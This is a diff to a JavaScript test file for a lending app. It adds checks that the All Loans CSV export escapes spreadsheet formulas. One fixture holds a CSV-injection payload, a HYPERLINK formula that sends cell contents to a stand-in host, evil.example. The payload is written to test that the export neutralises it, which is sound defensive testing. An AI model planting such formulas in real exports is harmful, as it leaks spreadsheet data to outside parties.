@@ -33,6 +33,16 @@ if (csvFrom < 0 || csvTo < 0) {
 }
 const csvEscapeSource = src.slice(csvFrom, csvTo + 2);
 
+// The All Loans export, lifted the same way. It used to do its own quoting and
+// skip csvEscape, so the formula guard above never reached the main export.
+const loansCsvFrom = src.indexOf("function _loansToCsv(loans) {");
+const loansCsvTo = src.indexOf("\n}\n", loansCsvFrom);
+if (loansCsvFrom < 0 || loansCsvTo < 0) {
+  console.error("FAIL: could not find _loansToCsv in app.js");
+  process.exit(1);
+}
+const loansCsvSource = src.slice(loansCsvFrom, loansCsvTo + 2);
+
 let failures = 0;
 const check = (name, cond, detail) => {
   if (cond) return;
@@ -64,6 +74,7 @@ const sandbox = {
 sandbox.globalThis = sandbox;
 vm.createContext(sandbox);
 vm.runInContext(csvEscapeSource + "\nglobalThis.csvEscape = csvEscape;", sandbox);
+vm.runInContext(loansCsvSource + "\nglobalThis._loansToCsv = _loansToCsv;", sandbox);
 // `const` at the top level of a script is a lexical binding, not a property of
 // the sandbox object, so the period table is lifted out explicitly.
 vm.runInContext(section + "\nglobalThis.REPORT_PERIODS = REPORT_PERIODS;", sandbox);
@@ -340,7 +351,7 @@ console.log("\nReport aggregation\n");
     // Outside the period on purpose.
     loan({ id: 4, itemId: 10, borrowerId: 100, out: at(500), ret: at(499) })
   ];
-  const items = [item(10, "Dongle", "AV"), item(11, "Clicker, wireless", "AV"), item(12, "Room key")];
+  const items = [item(10, "Dongle", "Tech"), item(11, "Clicker, wireless", "Tech"), item(12, "Room key")];
   const borrowers = [
     { id: 100, name: "Ada", phone: "4165550100" },
     { id: 101, name: "Grace", phone: "4165550101" }
@@ -411,6 +422,26 @@ console.log("\nReport aggregation\n");
   const none = sandbox.reportToCsv({ loans, items, borrowers, period: "week", now: NOW + 60 * DAY });
   check("a period with no loans exports just the header", none.replace(/^﻿/, "").split("\n").length === 1, none.split("\n").length);
   ok("the CSV is well-formed and scoped to the period");
+}
+
+// --- The All Loans export guards formulas too -----------------------------
+{
+  const csv = sandbox._loansToCsv([
+    {
+      id: 7,
+      itemNameSnapshot: "=1+2 Cable",
+      borrowerNameSnapshot: '=HYPERLINK("http://evil.example/?"&A2,"Open")',
+      borrowerPhoneSnapshot: "4165550100",
+      checkedOutAt: NOW,
+      conditionOut: "good",
+      notes: 'said "thanks"'
+    }
+  ]).replace(/^\uFEFF/, "");
+  const row = csv.split("\n")[1];
+  check("a kiosk-typed item name is not exported as a formula", row.includes(",'=1+2 Cable,"), row);
+  check("nor is a kiosk-typed borrower name", row.includes(`"'=HYPERLINK(`), row);
+  check("a quote in the notes is escaped once, not twice", row.endsWith(`"said ""thanks"""`), row);
+  ok("All Loans CSV goes through csvEscape like the other exports");
 }
 
 // --- The period key is bounded to a known set -----------------------------
